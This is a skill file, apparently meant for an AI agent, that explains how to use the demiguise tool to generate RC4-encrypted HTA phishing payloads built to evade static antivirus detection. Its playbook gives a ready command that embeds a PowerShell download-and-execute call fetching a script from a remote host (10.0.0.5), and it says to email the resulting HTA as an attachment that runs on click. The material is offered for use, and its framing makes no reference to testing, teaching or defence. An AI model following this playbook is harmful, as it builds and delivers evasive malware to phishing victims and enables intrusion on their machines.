---
name: demiguise-hta-crypt
description: "demiguise: HTA phishing payload. Signals: malware development, evasion development, generate encrypted HTA, RC4 key."
zh-signals: "demiguise: HTA 钓鱼载荷。信号:恶意软件开发,免杀开发,生成加密 HTA,RC4 密钥。"
when-to-use: >-
  Use when developing phishing payloads and you need to generate an encrypted HTA
  file that embeds a PowerShell command with an RC4 key to evade static detection.
---

# demiguise

- Attack Category: C45 AV Evasion and Payload Delivery
- Upstream Repository: https://github.com/nccgroup/demiguise
- Upstream License: AGPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/nccgroup/demiguise && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python demiguise.py -k key -c 'cmd /c whoami' -o out.hta` | Generate encrypted HTA |
| `-c payload.ps1` | PowerShell payload |
| `-k mykey` | RC4 key |
| `-o out.hta` | Output |

## Attack Scenario Playbook

### HTA phishing payload

```bash
python demiguise.py -k secret -c 'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/x.ps1")' -o doc.hta
# Email it as an .hta attachment; the encrypted payload runs on click
```

## Notes

By NCC; an HTA payload encryption tool that applies RC4 encryption plus embedded HTML, making it hard to catch with static scanning.